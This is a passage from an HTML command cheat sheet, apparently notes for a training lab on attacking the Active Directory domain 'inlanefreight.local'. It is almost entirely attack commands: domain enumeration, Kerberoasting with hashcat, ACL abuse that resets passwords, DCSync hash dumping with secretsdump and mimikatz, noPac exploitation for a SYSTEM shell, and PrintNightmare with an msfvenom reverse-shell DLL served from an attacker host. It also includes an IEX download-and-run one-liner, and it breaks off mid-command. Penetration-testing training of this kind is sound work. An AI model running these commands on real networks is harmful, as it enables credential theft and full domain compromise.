Enumeration"></a>Credentialed Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td><td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td><td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td><td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td></tr><tr><td><code> rpcclient $&gt; queryuser 0x457</code></td><td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; enumdomusers</code></td><td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td></tr><tr><td><code>psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></td><td>Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></td><td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>windapsearch.py -h</code></td><td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da</code></td><td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU</code></td><td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all</code></td><td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Enumeration-by-Living-Off-the-Land"><a href="#Enumeration-by-Living-Off-the-Land" class="headerlink" title="Enumeration by Living Off the Land"></a>Enumeration by Living Off the Land</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td></tr><tr><td><code>Import-Module ActiveDirectory</code></td><td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td></tr><tr><td><code>Get-ADDomain</code></td><td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></td><td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Filter * | select name</code></td><td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to search for a specifc group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Export-PowerViewCSV</code></td><td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td></tr><tr><td><code>ConvertTo-SID</code></td><td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it’s <code>SID</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-Domain</code></td><td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainController</code></td><td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser</code></td><td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainComputer</code></td><td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup</code></td><td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainOU</code></td><td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO</code></td><td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetShare</code></td><td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetSession</code></td><td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Test-AdminAccess</code></td><td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainShare</code></td><td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust</code></td><td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ForestTrust</code></td><td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>PowerView script that enumerates users who are in groups outside of the user’s domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>PowerView script that enumerates groups with users outside of the group’s domain and returns each foreign member. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></td><td>PowerView script used to list all the members of a target group (<code>&quot;Domain Admins&quot;</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td><td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td></tr><tr><td><code>.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></td><td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Transfering-Files"><a href="#Transfering-Files" class="headerlink" title="Transfering Files"></a>Transfering Files</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td></tr><tr><td><code>&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://172.16.5.222/SharpHound.exe&#39;)&quot;</code></td><td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td></tr><tr><td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td><td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m pip install .</code></td><td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -h</code></td><td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td><td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td><td>Impacket tool used to download&#x2F;request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td><td>Impacket tool used to download&#x2F;request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td><td>Impacket tool used to download&#x2F;request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td><td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>setspn.exe -Q */*</code></td><td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</code></td><td>PowerShell script used to download&#x2F;request the TGS ticket of a specific user from a Windows-based host.</td></tr><tr><td><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></td><td>Used to download&#x2F;request all TGS tickets from a WIndows-based host.</td></tr><tr><td><code>mimikatz # base64 /out:true</code></td><td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td></tr><tr><td><code>kerberos::list /export </code></td><td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td></tr><tr><td><code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </code></td><td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td></tr><tr><td><code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></td><td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td></tr><tr><td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td><td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td></tr><tr><td><code>sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code></td><td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td></tr><tr><td><code>cat sqldev_tgs_hashcat </code></td><td>Used to view the prepared hash from a Linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt </code></td><td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  Get-DomainUser * -spn | select samaccountname</code></td><td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></td><td>PowerView tool used to download&#x2F;request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td><td>Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host.</td></tr><tr><td><code>cat .\ilfreight_tgs.csv</code></td><td>Used to view the contents of the .csv file from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe</code></td><td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /stats</code></td><td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap</code></td><td>Used to request&#x2F;download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td><td>Used to request&#x2F;download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td><td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td><td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td></tr></tbody></table><h1 id="ACL-Enumeration-amp-Tactics"><a href="#ACL-Enumeration-amp-Tactics" class="headerlink" title="ACL Enumeration &amp; Tactics"></a>ACL Enumeration &amp; Tactics</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley</code></td><td>Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125;</code></td><td>Used to find all Windows domain objects that the user has rights over by mapping the user’s <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td></tr><tr><td><code>$guid= &quot;00299570-246d-11d0-a768-00aa006e0529&quot;   Get-ADObject -SearchBase &quot;CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)&quot; -Filter &#123;ObjectClass -like &#39;ControlAccessRight&#39;&#125; -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?&#123;$_.rightsGuid -eq $guid&#125; | fl</code></td><td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125; </code></td><td>Used to discover a domain object’s ACL by performing a search based on GUID’s (<code>-ResolveGUIDs</code>) from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td><td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td></tr><tr><td><code>foreach($line in [System.IO.File]::ReadLines(&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;)) &#123;get-acl  &quot;AD:\$(Get-ADUser $line)&quot; | Select-Object Path -ExpandProperty Access | Where-Object &#123;$_.IdentityReference -match &#39;INLANEFREIGHT\\wley&#39;&#125;&#125;</code></td><td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td></tr><tr><td><code>$SecPassword = ConvertTo-SecureString &#39;&lt;PASSWORD HERE&gt;&#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\wley&#39;, $SecPassword) </code></td><td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td></tr><tr><td><code>$damundsenPassword = ConvertTo-SecureString &#39;Pwn3d_by_ACLs!&#39; -AsPlainText -Force</code></td><td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td></tr><tr><td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td><td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Help Desk Level 1&quot; -Properties * | Select -ExpandProperty Members</code></td><td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>Add-DomainGroupMember -Identity &#39;Help Desk Level 1&#39; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; | Select MemberName</code></td><td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @&#123;serviceprincipalname=&#39;notahacker/LEGIT&#39;&#125; -Verbose</code></td><td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td><td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td></tr><tr><td><code>Remove-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>ConvertFrom-SddlString</code></td><td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -Identity adunn  | select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></td><td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>$sid= &quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#39;Replication-Get&#39;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></td><td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user’s replication rights. Performed from a Windows-based host.</td></tr><tr><td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td><td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td><td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td></tr></tbody></table><h1 id="Privileged-Access"><a href="#Privileged-Access" class="headerlink" title="Privileged Access"></a>Privileged Access</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>$password = ConvertTo-SecureString &quot;Klmcargo2&quot; -AsPlainText -Force</code></td><td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td></tr><tr><td><code>$cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\forend&quot;, $password)</code></td><td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td><td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td></tr><tr><td><code>evil-winrm -i 10.129.201.234 -u forend</code></td><td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td></tr><tr><td><code>Import-Module .\PowerUpSQL.ps1</code></td><td>Used to import the <code>PowerUpSQL</code> tool.</td></tr><tr><td><code>Get-SQLInstanceDomain</code></td><td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td></tr><tr><td><code>Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query &#39;Select @@version&#39;</code></td><td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query &#39;Select @@version&#39;</code>) from a Windows-based host.</td></tr><tr><td><code>mssqlclient.py</code></td><td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td></tr><tr><td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td><td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td></tr><tr><td><code>SQL&gt; help</code></td><td>Used to display mssqlclient.py options once connected to a MSSQL server.</td></tr><tr><td><code>SQL&gt; enable_xp_cmdshell</code></td><td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td></tr><tr><td><code>xp_cmdshell whoami /priv</code></td><td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td></tr></tbody></table><h1 id="NoPac"><a href="#NoPac" class="headerlink" title="NoPac"></a>NoPac</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td><td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td><td>Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>&#x2F;<code>Sam_The_Admin</code> from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td></tr></tbody></table><h1 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td><td>Used to clone a PrintNightmare exploit  using git from a Linux-based host.</td></tr><tr><td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td><td>Used to ensure the exploit author’s (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td></tr><tr><td><code>rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</code></td><td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td><td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td></tr><tr><td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td><td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 &#39;\\10.129.202.111\CompData\backupscript.dll&#39;</code></td><td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template 